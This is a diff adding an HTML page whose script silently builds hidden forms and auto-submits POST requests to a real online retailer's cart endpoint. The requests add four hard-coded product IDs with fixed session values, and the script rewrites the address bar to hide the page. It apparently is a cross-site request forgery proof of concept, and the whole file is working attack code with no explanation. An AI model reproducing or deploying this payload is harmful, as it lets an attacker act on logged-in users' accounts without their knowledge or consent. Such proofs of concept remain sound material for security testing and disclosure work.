@@ -1,0 +1,51 @@
+<html>
+<body>
+
+<script>
+const products = [
+  "49746363",
+  "49961588",
+  "49993188",
+  "49994478"
+];
+
+function addProduct(id, delay) {
+  setTimeout(() => {
+
+    const form = document.createElement("form");
+    form.method = "POST";
+    form.action = "https://www.therealreal.com/cart/items";
+
+    const fields = {
+      id: id,
+      _analytics_session_id: "1772452805893",
+      return_product_id: "",
+      protection_product_id: "",
+      query_id: "cc3ed214af22ae23fc8b727942010c9b"
+    };
+
+    for (const key in fields) {
+      const input = document.createElement("input");
+      input.type = "hidden";
+      input.name = key;
+      input.value = fields[key];
+      form.appendChild(input);
+    }
+
+    document.body.appendChild(form);
+    form.submit();
+
+  }, delay);
+}
+
+
+products.forEach((id, index) => {
+  addProduct(id, index * 1500);
+});
+
+history.pushState('', '', '/');
+
+</script>
+
+</body>
+</html>
